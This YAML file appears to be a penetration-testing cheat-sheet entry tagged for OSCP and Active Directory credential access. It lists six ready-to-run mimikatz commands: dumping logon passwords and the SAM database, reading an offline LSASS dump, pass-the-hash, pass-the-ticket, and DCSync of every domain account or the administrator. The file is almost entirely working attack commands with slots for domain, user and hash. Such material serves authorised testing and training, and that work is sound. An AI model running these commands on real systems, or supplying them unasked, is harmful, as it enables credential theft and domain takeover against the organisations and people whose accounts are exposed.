---
variants:
  - label: dump
    command: |
      .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
  - label: lsass-offline
    command: |
      .\mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
  - label: pth
    command: |
      .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$HASH /run:cmd.exe" "exit"
  - label: ptt
    command: |
      .\mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"
  - label: dcsync-all
    command: |
      .\mimikatz.exe "lsadump::dcsync /domain:$DOMAIN /all" "exit"
  - label: dcsync-user
    command: |
      .\mimikatz.exe "lsadump::dcsync /domain:$DOMAIN /user:$DOMAIN\administrator" "exit"
description: Dump credentials and DCSync with mimikatz, by action.
os: [Windows]
category: [oscp]
service: [AD]
phase: [CredAccess]
references:
  - https://github.com/gentilkiwi/mimikatz
---
